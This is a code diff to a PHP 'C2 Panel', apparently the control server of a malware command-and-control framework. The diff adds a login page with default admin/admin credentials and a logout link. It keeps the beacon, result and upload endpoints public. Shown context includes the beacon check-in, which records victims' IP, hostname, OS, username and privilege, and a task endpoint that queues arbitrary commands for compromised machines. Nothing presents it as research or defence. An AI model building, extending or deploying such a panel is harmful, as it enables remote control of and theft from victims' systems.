@@ -1,4 +1,61 @@
 <?php
+session_start();
+// ── Load .env ──
+$ENV=[];
+$envFile=__DIR__.'/.env';
+if(is_file($envFile)){
+    foreach(file($envFile,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)as$line){
+        $line=trim($line);if(str_starts_with($line,'#'))continue;
+        if(str_contains($line,'=')){$p=strpos($line,'=');$k=trim(substr($line,0,$p));$v=trim(substr($line,$p+1));$ENV[$k]=$v;}
+    }
+}
+$AUTH_USER=$ENV['PANEL_USERNAME']??'admin';
+$AUTH_PASS=$ENV['PANEL_PASSWORD']??'admin';
+
+// ── Auth check ──
+function requireAuth(){
+    global $AUTH_USER,$AUTH_PASS;
+    if(empty($_SESSION['panel_logged_in'])){
+        if($_SERVER['REQUEST_METHOD']==='POST'&&($_REQUEST['action']??'')==='login'){
+            $i=json_decode(file_get_contents('php://input'),1)??[];
+            if(($i['username']??'')===$AUTH_USER&&($i['password']??'')===$AUTH_PASS){
+                $_SESSION['panel_logged_in']=true;$_SESSION['panel_user']=$AUTH_USER;
+                http_response_code(200);header('Content-Type: application/json');echo json_encode(['status'=>'ok']);exit;
+            }
+            http_response_code(401);header('Content-Type: application/json');echo json_encode(['error'=>'Invalid credentials']);exit;
+        }
+        if($_REQUEST['action']??''==='logout'){session_destroy();header('Location: ?');exit;}
+        renderLogin();exit;
+    }
+}
+function renderLogin(){?>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>C2 Panel - Login</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,-apple-system,sans-serif;background:#080c14;color:#c8d0dc;height:100vh;display:flex;align-items:center;justify-content:center}
+.lg{background:#0f1620;border:1px solid #1e2a3a;border-radius:10px;padding:30px;width:320px}
+.lg h1{font-size:16px;text-align:center;margin-bottom:20px;letter-spacing:1px}
+.lg h1 span{color:#00c853}
+.lg label{display:block;font-size:11px;color:#6b7f99;margin:10px 0 4px}
+.lg input{width:100%;padding:8px 10px;background:#161f2e;border:1px solid #1e2a3a;border-radius:5px;color:#c8d0dc;font-size:13px;outline:none}
+.lg input:focus{border-color:#00c853}
+.lg button{width:100%;margin-top:18px;padding:8px;background:#00c853;border:none;border-radius:5px;color:#000;font-size:13px;font-weight:700;cursor:pointer}
+.lg button:hover{background:#00e060}
+.lg .er{color:#ff1744;font-size:11px;text-align:center;margin-top:10px;display:none}
+</style></head><body>
+<div class="lg"><h1>&#9670; C2 <span>Panel</span></h1>
+<form onsubmit="event.preventDefault();login()">
+<label>Username</label><input id="lu" value="<?=htmlspecialchars($GLOBALS['AUTH_USER'])?>" autocomplete="username">
+<label>Password</label><input id="lp" type="password" placeholder="password" autocomplete="current-password">
+<button type="submit">Sign In</button>
+<div class="er" id="ler">Invalid credentials</div>
+</form></div>
+<script>async function login(){
+const r=await fetch('?action=login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('lu').value,password:document.getElementById('lp').value})});
+if(r.ok){window.location.reload()}else{document.getElementById('ler').style.display='block'}
+}</script>
+</body></html>
+<?php exit;}
+
 define('STORAGE_DIR',__DIR__.'/data');define('UPLOAD_DIR',__DIR__.'/uploads');define('MEDIA_DIR',__DIR__.'/media');define('DEVICE_DIR',__DIR__.'/devices');define('HUMAN_DIR',__DIR__.'/humans');
 foreach([STORAGE_DIR,UPLOAD_DIR,MEDIA_DIR,DEVICE_DIR,HUMAN_DIR]as$d)is_dir($d)or mkdir($d,0755,true);
 function devicePath($u){return DEVICE_DIR.'/'.preg_replace('/[^a-zA-Z0-9-]/','',$u);}
@@ -39,6 +96,10 @@ function jo($d,$c=200){http_response_code($c);header('Content-Type: application/
 function je($m,$c=400){jo(['error'=>$m],$c);}
 function nm($m){if($_SERVER['REQUEST_METHOD']!==$m)je('Method not allowed',405);}
 $action=$_REQUEST['action']??'';
+// Require auth for all actions except beacon comms and login/logout
+$public=['beacon','result','login','logout'];
+if($_SERVER['REQUEST_METHOD']==='POST'&&in_array($action,['file','media_upload']))$public[]=$action;
+if(!in_array($action,$public))requireAuth();
 switch($action){
 case'beacon':nm('POST');$i=ji();if(empty($i['uuid']))je('Missing uuid');DB::i()->beaconUp($i['uuid'],['ip'=>$i['ip']??'','hostname'=>$i['hostname']??'','os'=>$i['os']??'','username'=>$i['username']??'','privilege'=>$i['privilege']??'user','pid'=>intval($i['pid']??0)]);jo(['tasks'=>DB::i()->taskP($i['uuid']),'sleep'=>rand(5,15)]);break;
 case'task':if($_SERVER['REQUEST_METHOD']==='POST'){$i=ji();if(empty($i['beacon_uuid'])||empty($i['command']))je('Missing');$id=DB::i()->taskC($i['beacon_uuid'],$i['command']);jo(['id'=>$id,'status'=>'created'],201);}else jo(DB::i()->tasks($_GET['beacon_uuid']??null,$_GET['status']??null));break;
@@ -307,6 +368,7 @@ a{color:var(--blue);text-decoration:none}
     <span style="color:var(--amber)"><span id="s-pend"><?=$pending?></span> pend</span>
     <span style="color:var(--cyan)"><span id="s-done"><?=$done?></span> done</span>
     <span><button id="hm-tg" class="btn btn-xs btn-hm" onclick="toggleHumans()">&#128100; Humans</button></span>
+    <span><a href="?action=logout" class="btn btn-xs btn-gh" style="text-decoration:none">&#128682; Logout</a></span>
 </div>
 </div>
 
